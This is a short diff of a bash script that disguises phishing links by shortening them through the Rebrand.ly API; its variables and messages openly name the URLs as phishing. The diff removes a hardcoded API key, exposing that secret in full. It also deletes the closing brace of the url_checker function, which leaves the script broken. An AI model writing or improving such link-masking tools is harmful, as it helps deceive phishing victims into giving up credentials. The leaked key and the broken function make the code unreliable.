@@ -8,8 +8,7 @@ url_checker() {
         echo -e "\e[31m [!] Invalid URL. Please use http or https.\e[0m"
         exit 1
     fi
-}
-
+read -p "Input your Rebrand.ly API Key: " API_KEY
 # (Additional ASCII art lines...)
 echo -e "### Masking Domain ###"
 
@@ -21,8 +20,6 @@ url_checker $phish
 sleep 1
 echo -e "\e[1;33m [*] Processing and modifying phishing URL...\e[0m"
 echo ""
-
-API_KEY="2fe4436fc9c64a09b287832f134535db"
 
 # Define the data as JSON
 data='{"destination": "'"$phish"'"}'
